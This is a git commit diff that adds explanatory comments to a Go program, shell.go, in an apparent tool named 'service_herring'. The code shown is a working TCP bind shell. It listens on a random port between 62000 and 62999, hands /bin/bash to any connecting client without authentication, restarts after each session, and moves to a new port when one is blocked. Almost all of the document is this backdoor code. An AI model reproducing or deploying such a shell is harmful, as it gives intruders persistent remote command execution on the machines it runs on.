bda372357b7337988ebed1a4c453e4593adfde21
MdbookTech <michael@mdbooktech.com>
2022-02-15 08:30:54 -0500

    Added comments

--- service_herring/shell/shell.go
+++ service_herring/shell/shell.go
@@ -17,6 +17,7 @@ var port string
 var verbose bool = false
 
 func main() {
+	//Check args
 	args := os.Args
 	if len(args) > 1 {
 		for i := 1; i < len(args); i++ {
@@ -25,21 +26,25 @@ func main() {
 			}
 		}
 	}
+	//Generate random port in between 62000-62999
 	port = "62" + getPort(0, "")
 	do()
 }
 
 func reset() {
+	//If connection was killed or firewall blocked the port, get another random port
 	port = "62" + getPort(0, "")
 	do()
 }
 
 func do() {
+	//Run the shell
 	fmt.Println("Listening on port " + port)
 	shell()
 }
 
 func getPort(i int, p string) string {
+	//Generate a random port
 	i++
 	if i > 3 {
 		return p
@@ -54,8 +59,11 @@ func random(n int) int {
 }
 
 func shell() {
+	//Establish TCP bind shell
+	//Listen on the chosen port
 	list, err := net.Listen("tcp", host+":"+port)
 	if err != nil {
+		//If there is an error, reset and try again
 		if verbose {
 			fmt.Println(err.Error())
 		}
@@ -63,6 +71,7 @@ func shell() {
 		reset()
 		return
 	}
+	//Accept any incoming connections
 	con, err := list.Accept()
 	if err != nil {
 		if verbose {
@@ -73,15 +82,17 @@ func shell() {
 		do()
 		return
 	}
-
 	if verbose {
 		fmt.Println("Connection established")
 	}
+	//Open a bash shell and set Stdin, Stdout and Stderr
+	//to the connection stream
 	cmd := exec.Command("/bin/bash")
 	cmd.Stdin = con
 	cmd.Stdout = con
 	cmd.Stderr = con
 	cmd.Run()
+	//After the shell exits, run again
 	_, err = con.Write([]byte("Connection terminated. Restarting..."))
 	list.Close()
 	con.Close()
